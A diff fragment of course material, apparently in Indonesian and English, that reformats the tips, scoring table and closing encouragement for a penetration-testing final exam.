+1. ⏰ **Manage your time** - Jangan terlalu lama di satu target
+2. 📸 **Document everything** - Screenshot setiap langkah
+3. 🎯 **Think systematically** - Ikuti metodologi
+4. 🧘 **Don't panic** - Stuck? Pindah dulu, kembali nanti
+5. ✨ **Quality > Quantity** - Lebih baik complete sedikit
 
 ---
 
 ## 🏆 Scoring
 
+<div class="comparison-table">
+
 | Achievement | Points |
 |-------------|--------|
 | Each flag found | 50 pts |
-| Each vulnerability exploited | 30 pts |
+| Each vuln exploited | 30 pts |
 | Privilege escalation | 50 pts |
 | Complete methodology | 20 pts |
 | Professional report | 50 pts |
-| **Maximum Total** | **500 pts** |
+| **Maximum** | **500 pts** |
+
+</div>
 
 ---
 
-> 🎓 **Good luck on your final exam!**
-> 
-> Tunjukkan semua yang telah Anda pelajari semester ini.
-> Ingat: seorang pentester yang baik bukan hanya tentang skill teknis,
-> tapi juga tentang metodologi, dokumentasi, dan komunikasi.
+<div class="task-box">
+
+## 🎓 Good luck on your final exam!
+
+Tunjukkan semua yang telah kamu pelajari.
+
+Ingat: seorang pentester yang baik bukan hanya tentang **skill teknis**, tapi juga tentang **metodologi**, **dokumentasi**, dan **komunikasi**.
+
+</div>
 `,
     prerequisites: [
       'Menyelesaikan semua Session 1-7',
